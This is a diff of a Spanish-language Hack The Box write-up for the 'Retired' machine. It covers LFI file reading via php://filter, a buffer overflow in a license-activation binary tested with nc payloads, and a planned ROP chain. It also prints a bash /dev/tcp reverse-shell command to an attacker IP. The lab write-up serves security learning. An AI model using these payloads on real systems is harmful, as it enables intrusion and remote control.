@@ -1,27 +1,31 @@
 ---
 layout: single
 title: Retired - Hack The Box
-excerpt: "Aqui explotamos un repo de Github y una aplicacion personalizada"
+excerpt: "Esta máquina a partir de un LFI nos permite detectar un binario que explotamos con ROP buffer overflow"
 date: 2018-11-24
 classes: wide
 header:
-  teaser: /assets/images/htb-devzat/devzat1.png
+  teaser: /assets/images/htb-retired/retired1.png
 categories:
   - hackthebox
-  - infosec
+  - writeup
 tags:
   - hackthebox
-  - binary exploit  
+  - LFI
+  - binarios
+  - ROP  
 ---
 
 # 10.10.11.154 - Retired
 ![](/assets/images/htb-retired/retired1.png)
 
 ------------------------
-**Disclaimer**: esta maquina catalogada como media por htb, pero que deberia ser hard, debido a su complejidad uve que tirar del writeup 
-de [ippsec](https://www.youtube.com/watch?v=1MDqn1kBHQM). Aun asi me ha servido como aprendizaje y al poder entender todo el proceso lo he explicado
+**Disclaimer**: esta maquina catalogada como media por htb, pero que deberia ser hard, debido a 
+su complejidad tuve que tirar del writeup de [ippsec](https://www.youtube.com/watch?v=1MDqn1kBHQM).
+ Aun asi me ha servido como aprendizaje y al poder entender todo el proceso lo he explicado
 para que quede mas claro que el agua.
 
+-----------------------------
 
 # Part 1: Enumeración
 Puertos abiertos -> 22(ssh), 80(http)
@@ -88,14 +92,13 @@ La página beta.html dice tal que así:
 ![](/assets/images/htb-retired/retired3.PNG)
 
 ```
-Actualmente desarollando para EMUEMU (lo busque en google pero no hay nada). Si nos compraste una consola OSTRICH 
+*Actualmente desarollando para EMUEMU (lo busque en google pero no hay nada). Si nos compraste una consola OSTRICH 
 y quieres participar en el siguiente paso puedes activar tu licencia con la app "activate_license"
-Un archivo de licencia contiene una llave de 512 bits que está en el paquete de la consola OSTRICH.
+Un archivo de licencia contiene una llave de 512 bits que está en el paquete de la consola OSTRICH.*
 ```
-Generamos una llave con openssl ```openssl genrsa -out license.key 512``` y la subimos
-```
-/POST a /activate_license.php || datos -> name="licensefile"; filename="license.key" || contenido -> la llave
-```
+Generamos una llave con openssl `openssl genrsa -out license.key 512` y la subimos
+`/POST a /activate_license.php || datos -> name="licensefile"; filename="license.key" || contenido -> la llave`
+
 Nos redirige a /activate_license.php que no devuelve ningun output. Pero podemos ver dicho archivo con el LFI.
 ```console
 └─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=activate_license.php | base64 -d
@@ -203,15 +206,15 @@ void activate_license(int sockfd){
   sqlite = sqlite3_step(stmt); port = sqlite3_reset(stmt); port = sqlite3_finalize(stmt);
   printf("[+] activated license: %s\n",buffer); return;}
 ```
-Lo critico está en la funcion read ```licencia = read(sockfd,buffer,(ulong)msglen); ``` porque ¿Y si lo que le metemos a buffer por sockfd es
-mas grande que lo especificado en mslen?
+Lo critico está en la funcion read ```licencia = read(sockfd,buffer,(ulong)msglen); ``` porque 
+¿Y si lo que le metemos a buffer por sockfd es mas grande que lo especificado en mslen?
 ```console
 └─$ printf "\x00\x00\x00\x01AAAA" | nc localhost 6668
 └─$ ./activate_licens 666          
 [+] reading 1 bytes
 [+] activated license: A
 ```
-Si le mandamos esto ```printf "\x00\x00\x02\x00$(python3 -c 'print("A" * 600)')" | nc localhost 6668``` (mete 600 A en 512 de tamaño) 
+Si le mandamos esto `printf "\x00\x00\x02\x00$(python3 -c 'print("A" * 600)')" | nc localhost 6668` (mete 600 A en 512 de tamaño) 
 al final de las AAA pone bytes extraños,  puede que el proceso se ha corromprido de cierta manera. Pero por que no da SEGFAULT? porque es un proceso hijo
 Si lo corremos con gdb en otro puerto (y seguimos al hijo):
 ```console
@@ -254,7 +257,7 @@ Es decir a los 520 bytes basura empezamos a escribir en el putnero de instruccio
 Este binario tiene de especial unas cuantas protecciones (por ejemplo NX que nos impide hacer un shellcode buffer overflow) y que es un
 binario remoto, es decir se interactua con el a partir de subir una llave.key a una página web.
 Por lo que esa llave que se sube tiene que ser epecial, dandonos una reverse shell:
-```system(bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1')```
+`system(bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1')`
 
 Como estamos en 64 bytes tenemos que tirar de ROP:
 En 64 bytes las funciones toman sus argumentos de los registros del procesador en este orden de prioridad -> rdi, rdi, rdx, r8, r9  
